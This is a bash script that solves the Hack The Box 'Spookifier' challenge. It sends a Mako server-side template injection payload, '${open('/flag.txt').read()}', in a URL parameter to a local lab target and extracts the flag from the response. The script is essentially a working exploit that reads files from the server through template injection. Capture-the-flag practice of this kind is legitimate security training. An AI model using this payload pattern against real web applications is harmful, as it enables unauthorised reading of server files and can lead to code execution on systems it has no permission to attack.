#!/bin/bash
# https://app.hackthebox.com/challenges/Spookifier
# Tags: Server-side template injection, SSTI, Python, Mako

TARGET=127.0.0.1:1337
SSTI="\${open('/flag.txt').read()}"
FLAG=$(curl -s "http://$TARGET/?text=$(echo -n $SSTI | jq -sRr @uri)" | grep -oP 'HTB\{.*?\}')

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
